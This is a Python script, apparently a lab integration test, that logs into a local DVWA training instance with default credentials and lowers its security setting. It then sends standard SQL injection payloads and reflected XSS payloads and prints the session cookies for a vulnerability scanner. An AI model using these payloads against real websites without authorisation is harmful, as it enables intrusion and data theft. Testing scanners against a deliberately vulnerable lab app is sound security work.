"""DVWA login bypass + WVS integration test"""
import requests

s = requests.Session()
s.get('http://192.168.18.131/dvwa/setup.php', timeout=5)

# 1. Login with admin/password (works)
s.post('http://192.168.18.131/dvwa/login.php',
       data={'username': 'admin', 'password': 'password', 'Login': 'Login'}, timeout=5)

# 2. Change security to low
r_sec = s.get('http://192.168.18.131/dvwa/security.php', timeout=5)
import re
sec_match = re.search(r'<option[^>]*value=["\']([^"\']+)["\'][^>]*>\s*low', r_sec.text, re.I)
if sec_match:
    low_val = sec_match.group(1)
    s.post('http://192.168.18.131/dvwa/security.php',
           data={'security': low_val, 'seclev_submit': 'Submit'}, timeout=5)
    print("Security set to low")
else:
    print("Could not find low security option")

# Check security cookie
print(f"Cookies: {dict(s.cookies)}")

# 3. Test SQLi on low security
print("\n=== SQLi (LOW security) ===")
r_base = s.get('http://192.168.18.131/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit', timeout=5)
print(f"Baseline: len={len(r_base.text)}")
for payload in ["1' OR '1'='1", "1' OR 1=1 --", "admin' OR '1'='1' --", "1' UNION SELECT NULL --"]:
    rp = s.get(f"http://192.168.18.131/dvwa/vulnerabilities/sqli/?id={payload}&Submit=Submit", timeout=5)
    diff = len(rp.text) != len(r_base.text)
    changed = diff or ('admin' in rp.text and 'admin' not in r_base.text[:100])
    print(f"  {payload[:35]:35} len={len(rp.text):5} diff={diff}")

# 4. Test XSS on low security
print("\n=== XSS reflected (LOW security) ===")
for payload in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]:
    rp = s.get(f"http://192.168.18.131/dvwa/vulnerabilities/xss_r/?name={payload}&Submit=Submit", timeout=5)
    reflected = payload in rp.text
    print(f"  {payload[:40]:40} reflected={reflected}")

# 5. Extract cookies for WVS to use
print(f"\n=== Auth Cookies for WVS ===")
for k, v in s.cookies.items():
    print(f"  {k}={v}")
